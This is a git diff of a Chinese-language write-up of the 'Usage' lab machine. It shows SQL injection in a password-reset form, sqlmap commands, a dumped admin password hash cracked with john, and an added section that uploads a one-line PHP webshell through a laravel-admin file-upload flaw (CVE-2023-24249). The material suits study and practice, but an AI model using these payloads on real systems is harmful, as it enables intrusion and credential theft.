@@ -1,4 +1,4 @@
-## Usage 没通过
+<img width="1354" height="369" alt="截屏2025-09-18 20 38 33" src="https://github.com/user-attachments/assets/535a012a-9eed-4c59-a564-e235d64ad5aa" />## Usage 没通过
 
 ### 500 是 HTTP 状态码，叫 500 Internal Server Error，表示服务器在处理请求时内部出错（代码崩溃、后端异常、资源耗尽等）
 #### 其一什么时候改用 Connection: close，服务器在连接复用时表现异常（比如连接复用导致响应错乱、状态混淆或500错误）
@@ -52,19 +52,9 @@ SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
 ```
 #### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
 ### [1]burpsuite本地拦截
-
-
-
 #### 在burpsuite复制的按键Ctrl+C
 #### 粘贴到vi里面的按键Shift+Ctrl+V
-```
-[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B 
-```
-```
-[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B --dbs
 
-[★]$ sqlmap -r reset.req -p email --batch --level 5 --risk 3 --technique=B --dbs --threads 10
-```
 #### 注册的是test@example.com
 #### 拦截的是test@example.com'
 #### 手动修改1.在reset.req去掉末尾的%27
@@ -209,7 +199,7 @@ Table: admin_users
 | 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
 +----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
 ```
-#### 我们获得Administrator用户的哈希值，将其保存到一个名为hash的文件中，并将其提供给哈希破解工具john：
+#### 我们获得Administrator用户的哈希值，将其保存到一个名为hash的文件中，并将其提供给哈希破解工具john：
 ```
 [★]$ vi hash
 [★]$ cp /usr/share/wordlists/rockyou.txt.gz .
@@ -228,3 +218,33 @@ Session completed.
 ```
 #### 密码为whatever1 
 ### 访问admin.usage.htb,用户/密码：admin/whatever1
+
+#### 在仪表板的Environment部分，我们看到正在使用Laravel 10.18.0和PHP 8.1.2。在在撰写本文时，这两个版本都没有公开的重大漏洞。然而，在Dependencies选项卡的右边，我们看到一些库和包在使用。值得注意的是，该网站使用了encore/laravel-admin 1.8.18，这似乎很容易受到攻击。
+![918空鸣918台风918忌日](images/091806.png)
+https://nvd.nist.gov/vuln/detail/CVE-2023-24249
+#### laravel-admin v1.8.19 中的任意文件上传漏洞允许攻击者通过精心设计的 PHP 文件执行任意代码。
+https://flyd.uk/post/cve-2023-24249/
+#### larravel-admin存在问题，允许攻击者绕过文件上传限制，攻击者可以上传*.php格式的文件进行远程代码执行
+https://github.com/IDUZZEL/CVE-2023-24249-Exploit
+#### 为了学习，我们将手动利用这个向量
+```
+攻击的工作流程如下：
+1. 上传一个PHP webshell为.jpg文件。
+2. 拦截请求并将扩展名设置为.jpg.php。
+3. 直接访问上传的文件，执行PHP webshell。
+```
+#### 首先，我们通过点击右上角的用户图标下拉导航菜单：
+![918空鸣918台风918忌日](images/091807.png)
+#### 接下来，我们按下设置按钮，重定向到/admin/auth/Setting
+#### 在这里，我们可以上传一个新的头像图像。我们在机器上创建一个简单的php.shell
+```
+[★]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
+[★]$ mv shell.php shell.jpg
+```
+![918空鸣918台风918忌日](images/091808.png)
+#### 在按下Submit之前，我们打开BurpSuite代理来拦截上传请求。
+![918空鸣918台风918忌日](images/091809.png)
+#### Ctrl + R,Shift + Ctrl + R,只在shell.jpg后面加上.php，Send；之后让浏览器连接上网，再Forword；浏览器就有了：
+![918空鸣918台风918忌日](images/091810.png)
+#### 一旦我们转发请求，图像上传成功，我们可以复制链接到它所在的位置存储
+#### 通过在新选项卡中打开该链接，我们可以通过附加？甜瓜={命令}到URL。例如，要运行id命令，我们访问：
